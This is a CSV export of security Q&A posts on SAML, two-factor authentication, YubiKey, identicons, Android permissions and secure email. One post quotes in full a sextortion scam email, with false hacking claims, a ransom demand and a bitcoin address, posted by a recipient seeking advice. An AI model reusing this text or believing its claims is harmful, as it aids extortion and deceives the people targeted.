Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate,ContentLicense
"206262","1","206273","","2019-03-27 20:30:41","","1","128","<p>I have a SaaS app (App), and it has established SAML trust relationships with two of our clients, Acme and Foo.</p>

<p>Acme users log in to App through an IdP-initiated flow. Foo users also log in to App through an IdP-initiated flow. Accounts in App are identified by email address, say jdoe@acme.com and rsmith@foo.com.</p>

<p>A bad actor at Acme decides to create an account in their IdP identified by rsmith@foo.com. Then the bad actor tries to sign in to App with that account (an account called ""rsmith@foo.com"" that lives in Acme's IdP). How do I prevent that?</p>

<p>In other words, I want the trust relationship between App and Acme to be limited only to accounts @acme.com, and the trust relationship between App and Foo to be limited only to accounts @foo.com.</p>

<p>In other other words, if Acme's IdP tries to authenticate a user that ""belongs"" to Foo's IdP, then I don't want to authenticate that user.</p>
","47378","","","","","2019-03-28 00:58:43","SAML Security Question","<account-security><saml>","1","0","","","","CC BY-SA 4.0"
"206319","1","","","2019-03-28 16:57:18","","2","2404","<p>So, today I received an email in my Gmail account which landed automatically in the spam folder. This was the email content:</p>

<blockquote>
  <p>Hi!</p>
  
  <p>As you may have noticed, I sent you an email from your account. This
  means that I have full access to your account: At the time of hacking
  your account(d*****@gmail.com) had this password: ******* (not revealed by me intentionally here)</p>
  
  <p>You can say: this is my, but old password! Or: I can change my
  password at any time!</p>
  
  <p>Of course! You will be right, but the fact is that when you change the
  password, my malicious code every time saved a new one!</p>
  
  <p>I've been watching you for a few months now. But the fact is that you
  were infected with malware through an adult site that you visited.</p>
  
  <p>If you are not familiar with this, I will explain. Trojan Virus gives
  me full access and control over a computer or other device. This means
  that I can see everything on your screen, turn on the camera and
  microphone, but you do not know about it.</p>
  
  <p>I also have access to all your contacts and all your correspondence
  from e-mail and messengers.</p>
  
  <p>Why your antivirus did not detect my malware? Answer: My malware uses
  the driver, I update its signatures every 4 hours so that your
  antivirus is silent.</p>
  
  <p>I made a video showing how you satisfy yourself in the left half of
  the screen, and in the right half you see the video that you watched.
  With one click of the mouse, I can send this video to all your emails
  and contacts on social networks. I can also post access to all your
  e-mail correspondence and messengers that you use.</p>
  
  <p>If you want to prevent this, transfer the amount of $770 to my bitcoin
  address (if you do not know how to do this, write to Google: ""Buy
  Bitcoin"").</p>
  
  <p>My bitcoin address (BTC Wallet) is: 1GB22WpNfFPcAYnad1Sd3qWoVJeDbtN72M</p>
  
  <p>After receiving the payment, I will delete the video and you will
  never hear me again. I give you 48 hours to pay. I have a notice
  reading this letter, and the timer will work when you see this letter.</p>
  
  <p>Filing a complaint somewhere does not make sense because this email
  cannot be tracked like my bitcoin address. I do not make any mistakes.</p>
  
  <p>If I find that you have shared this message with someone else, the
  video will be immediately distributed. Bye!</p>
</blockquote>

<p>Now, here are the few things I observed:</p>

<ul>
<li>under from, my email address was written.</li>
<li>under to, that password (which is mentioned in the email) and my email address mentioned inside angular quotes.</li>
</ul>

<p>Although that password which was mentioned in the email was my password around 4-5 years ago and I'm also not sure that whether it belongs to my Gmail account or some other account.</p>

<p>Now, my question is what should I do to tackle this situation? Should I simply ignore this email or report to Google or do something else? Please advise as I'm a bit worried on seeing this email.</p>

<p><strong>Edit: I have changed my current account password as a security measure.</strong></p>
","189828","","189828","","2019-03-28 17:06:10","2019-03-28 17:09:33","Should I be worried by an email which said my account was under attack?","<malware><attacks><attack-prevention><account-security><gmail>","1","3","","2019-03-28 17:41:20","","CC BY-SA 4.0"
"206389","1","","","2019-03-29 16:04:32","","0","301","<p>I am aware of some of the main competitors in this space, including: Lavabit, Countermail, Fastmail, Proton.  But, I don't have enough knowledge to differentiate them.  Along the same line, I don't think I truly understand what Lavabit does.  It seems like it is more of a sophisticated third party encryption system than a true user friendly email system.</p>

<p>Although I am somewhat concerned about privacy, my main concern is security.  I don't want to be tracked by google ad text as I am when I use my current gmail.  And, I feel like that renders me vulnerable not only to ads, pop ups, videos but also outright spamware, bugs, etc.  I recently suffered a related attack.  And, I want to reduce my risk along those lines.  </p>
","202703","","202703","","2019-03-29 17:10:23","2019-03-29 20:22:52","Are email systems like Countermail safe?","<privacy><email><account-security>","3","0","","","","CC BY-SA 4.0"
"139499","1","","","2016-10-12 00:20:50","","1","159","<p>I am  a little confused about the definition of two factor authentication. Does a login method containing a hardware generated pin and SMS verification constitute two factor authentication?</p>
","127193","","98538","","2016-10-12 13:53:33","2016-10-12 13:53:33","Does a hardware generated pin plus SMS verification count as two factor authentication?","<authentication><multi-factor><account-security>","2","1","","","","CC BY-SA 3.0"
"206594","1","206597","","2019-04-02 02:52:49","","10","586","<p>As shown in this <a href=""https://meta.stackexchange.com/questions/17443/how-is-the-default-user-avatar-generated"">question</a>, default user avatars (like mine) are identicons and are generated with the user's email (where provided) or the user's IP address (where the email is <em>not</em> provided).</p>

<p>Given any identicon and information of whether it was generated from an email or IP address, can the email or IP address be identified? <strong>If yes</strong>, post my email in a spoiler (I registered an email with my account). <strong>If no</strong>, provide reasoning why.</p>
","","user203478","106285","","2019-04-02 04:02:32","2021-03-21 02:16:52","Is it possible to ""reverse engineer"" identicons?","<account-security><identity>","1","0","","","","CC BY-SA 4.0"
"206618","1","","","2019-04-02 09:28:33","","1","120","<p>I've noticed a trend in how big companies (Amazon, Skype, and a few others I don't remember in particular) handle e-mail authentication.</p>

<p>Rather than e-mailing clickable links with some single-use token, they've switched to short/readable security codes, which the user is expected to manually highlight, copy, and paste into a textfield on the page.</p>

<p>I can think of two motivations behind this change:</p>

<ol>
<li>A clickable link causes a ""discontinuous"" user experience. The user navigates around on one page, causes a recovery e-mail to be sent, but clicking the link opens a new tab while the previous one still lingers</li>
<li>For security: to train users not to click links in e-mails sent by these companies</li>
</ol>

<p>Is it one of these two reasons? Is it something else? Is there any literature that compares the two techniques?</p>
","70311","","","","","2019-04-02 09:28:33","Authentication: E-mailing security codes vs clickable links","<authentication><email><account-security><account-lockout>","0","2","","","","CC BY-SA 4.0"
"139650","1","","","2016-10-13 10:55:14","","0","229","<p>Almost everyday some media outlet reports that a bunch of accounts have been pasted on the internet and some of them include both email-id and password. But I don't understand how this is useful. Even if you know the email-id and password you can't just login since gmail by default will prevent suspicious logins, so whats the point of making them public? Like what are hackers trying to achieve?</p>
","127378","","98538","","2016-10-13 11:00:21","2016-10-13 11:07:16","Whats the point of publishing Gmail password lists?","<email><gmail><account-security>","1","3","","","","CC BY-SA 3.0"
"206657","1","","","2019-04-03 00:00:40","","1","327","<p>There are a number of apps which ask for storage permission in Android. However it is unclear exactly what parts of storage are they able to access with this permission. As an example, would an app granted storage permission be able to access:</p>

<ol>
<li>Photos</li>
<li>Files in Dropbox</li>
<li>Files in Google Drive</li>
<li>Any file, photo or document anywhere on the phone</li>
</ol>

<p>I thought Android was sandboxing apps which would imply that an app should at least not be able to access personal files under Dropbox as an example. </p>

<p>What parts of the directory does storage permission give access to?</p>
","186651","","186651","","2019-04-11 22:55:01","2019-04-11 22:55:01","Android storage permission","<android><account-security>","0","0","","","","CC BY-SA 4.0"
"70613","1","70619","","2014-10-14 00:10:33","","11","4105","<p>I've been doing some reading about YubiKey (for example <a href=""https://security.stackexchange.com/questions/17922/what-is-a-yubi-key-and-how-does-it-work"">What is a Yubi key and how does it work?</a>) and found the information to be incomplete. It's my understanding, that when the user is prompted to answer a password, all they have to do is plug the YubiKey into a USB port and press its button and then it automatically types out a password into the active text field.</p>

<p><strong>Point 1)</strong><br>
According to <a href=""http://www.linuxjournal.com/magazine/yubikey-one-time-password-authentication"" rel=""nofollow noreferrer"">Linux Journal</a> </p>

<blockquote>
  <p>Each time you press the button on the device, it generates a one-time
  password and sends it to the host machine as if you had entered it on
  a keyboard.  </p>
</blockquote>

<p>So if it's a different password each time what good does that do?</p>

<p><strong>Point 2)</strong><br>
Is it any more secure than using any USB key with a key file on it?</p>

<p><strong>Point 3)</strong><br>
From <a href=""http://www.yubico.com/support/faq/"" rel=""nofollow noreferrer"">Yubico</a> it's not possible to backup the device so if you lose it or break it you're in trouble (in this sense a regular key file is much better).</p>

<p><strong>Point 4)</strong><br>
I've <a href=""https://security.stackexchange.com/questions/45366/how-does-yubikey-protects-its-secret-key"">read</a> that it's not susceptible to malware copying the key, but I don't believe this. If it acts like a keyboard, what's stopping a keylogger from intercepting the keystrokes? </p>

<p><strong>Point 5)</strong><br>
Yubikey is <a href=""https://developers.yubico.com/"" rel=""nofollow noreferrer"">open source</a>. Does it matter since it's primarily a hardware device?</p>

<p><strong>Point 6)</strong><br>
If it does just enter a password, how is this different than just having another password written down or memorized?</p>
","10714","","-1","","2017-03-17 13:14:43","2014-10-14 02:59:43","What is the purpose of yubikey","<security-theater><yubikey>","2","3","","","","CC BY-SA 3.0"
"1809","1","1810","","2011-01-21 21:02:51","","7","1803","<p>I've been playing with mod_security for some time and I'd like somehow to use it in my master thesis. I don't know exactly how this work could be more interesting than describing what mod_security does, what kind of web attacks can be prevented using it, what are other functions of it (like analysing if the requests are really HTTP, analysing XML). I'd rather not focus on this particular tool, but create some system that would secure for example some specific kinds of websites. 
What could make it more reaserch-like? Any hints please?</p>
","1167","","665","","2011-04-01 21:48:50","2011-04-03 03:22:49","Master thesis topic - mod_security","<research><apache><waf><mod-security>","5","2","","","","CC BY-SA 2.5"
